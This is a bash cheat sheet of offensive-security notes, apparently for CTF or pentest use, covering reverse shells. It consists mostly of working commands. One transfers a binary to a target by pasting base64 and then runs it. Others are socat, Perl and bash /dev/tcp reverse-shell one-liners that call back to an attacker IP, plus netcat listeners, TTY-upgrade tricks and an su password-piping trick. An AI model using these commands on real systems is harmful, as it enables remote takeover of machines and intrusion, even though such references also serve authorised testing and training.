#!/usr/bin/env bash

# Transfer binaries

# 1. source_host
bin=
(
printf '%s\n' \
  ': > /tmp/1';
base64 "$bin" | xargs -i printf '%s\n' "printf '%s' '"{}"' >> /tmp/1";
printf '%s\n' \
  'base64 -d /tmp/1 > /tmp/2' \
  'chmod +x /tmp/2' \
  '/tmp/2'
) | xclip -in

# 2. target_host
# [ Paste clipboard content... ]

# Static binary

# https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
# 1. attacker_host
socat file:"$(tty)",raw,echo=0 tcp-listen:8081
# 2. vulnerable_host
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.2.15:8081

# Language specific

perl -e 'use Socket;$i="10.0.2.15";$p=8081;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# https://www.gnucitizen.org/blog/reverse-shell-with-bash/
exec 5<>/dev/tcp/10.0.2.15/8080
cat <&5 | while read -r l; do $l 2>&5 >&5; done
# ||
while read -r l 0<&5; do $l 2>&5 >&5; done

# 1. vulnerable_host
bash -i > /dev/tcp/10.0.2.15/8080 0<&1 2>&1
# 2. attacker_host
script /dev/null

# Upgrading to tty

# ||
# https://steemit.com/hacking/@synapse/hacking-getting-a-functional-tty-from-a-reverse-shell
# https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell
# 1. attacker_host
stty raw -echo; nc -lp 8080; stty sane
# ...
script /dev/null
export TERM=xterm

# https://stackoverflow.com/questions/32910661/pretend-to-be-a-tty-in-bash-for-any-command
# https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal/41872292
# https://unix.stackexchange.com/questions/122616/why-do-i-need-a-tty-to-run-sudo-if-i-can-sudo-without-a-password
(sleep 2; echo 'admin') | script -qc 'su -c whoami - root'
0<&- script -qfc "ls --color=auto" /dev/null | cat

stty_state=$(stty -g)
stty raw -echo
# ...
stty raw echo
# ||
stty "$stty_state"

# Validation
tty
# => /dev/pts/0
# ||
[[ $- == *i* ]] &&  echo "y" || echo "n"

# References:
# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
# https://guide.offsecnewbie.com/shells
# https://highon.coffee/blog/reverse-shell-cheat-sheet/
# https://alamot.github.io/reverse_shells/
# https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
